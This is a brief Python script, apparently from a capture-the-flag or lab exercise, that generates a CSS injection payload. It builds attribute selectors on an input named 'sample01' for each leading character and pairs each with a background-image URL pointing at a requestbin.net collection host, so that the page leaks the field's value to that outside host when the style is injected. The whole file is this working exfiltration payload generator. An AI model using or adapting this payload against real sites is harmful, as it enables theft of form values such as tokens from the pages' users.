import string


PROPERTIES = 'background-image: url({scheme}{host}/?{ch})'
SELECTOR = 'input[name="sample01"][value^="{ch}"]'
SCHEME = "//"
HOST = "requestbin.net/r/1lsp0tb1"
payload = ''
for ch in string.printable[:36]:
    tmp = ''
    tmp += SELECTOR.format(ch=ch)
    tmp += '{ '
    tmp += PROPERTIES.format(scheme=SCHEME, host=HOST, ch=ch)
    tmp += ' }'
    payload += tmp
    # print(tmp)
print("<style>")
print(payload)
print("</style>")
